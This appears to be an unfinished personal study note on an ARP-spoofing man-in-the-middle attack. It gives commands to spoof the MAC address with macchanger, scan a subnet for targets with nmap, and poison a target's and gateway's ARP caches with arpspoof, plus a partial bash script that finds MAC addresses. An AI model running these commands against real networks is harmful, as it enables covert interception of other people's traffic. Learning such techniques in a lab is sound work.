# TODO - Man in the Middle with ARP spoofing

Welcome again :D&#x20;

Im actually pleased of myself because Im explaining to me and Im actually understanding something LOL

## Recap

### change the MAC

```
sudo macchanger -r eth0 
```

### reverse DNS request to get all the hostname

and find the target

```
nmap -sL 192.168.1.0/24
```

### ARP spoofing

```
sudo arpspoof -i eth0 -t 192.168.1.115 -r 192.168.1.1 
```

Now we need not to arouse suspicion

## Packet redirect

As if we were switches we need to use MAC addresses to forward data at the data link layer (layer 2) of the OSI model. \
\
Some switches can also forward data at the network layer (layer 3) by additionally incorporating routing functionality. Such switches are commonly known as layer-3 switches or [multilayer switches](https://en.wikipedia.org/wiki/Multilayer\_switch).

A script could be useful:

```
./basic_mitm 192.168.1.65 192.168.1.1
```

```bash
#!/bin/bash

echo "$1"
echo "$2"

mac1=$(sudo nmap -nsP "$1" | grep MAC | awk -F\  ' { print $3 } ' )
mac2=$(sudo nmap -nsP "$2" | grep MAC | awk -F\  ' { print $3 } ' )

echo "$mac1"
echo "$mac2"
```

{% embed url="https://linux.die.net/man/8/iptables" %}

{% hint style="info" %}
iptables command has a "mac" section that could be useful
{% endhint %}

## Sources

{% embed url="https://www.cyberciti.biz/tips/iptables-mac-address-filtering.html" %}

{% embed url="https://explainshell.com/explain?cmd=nmap+-sP" %}
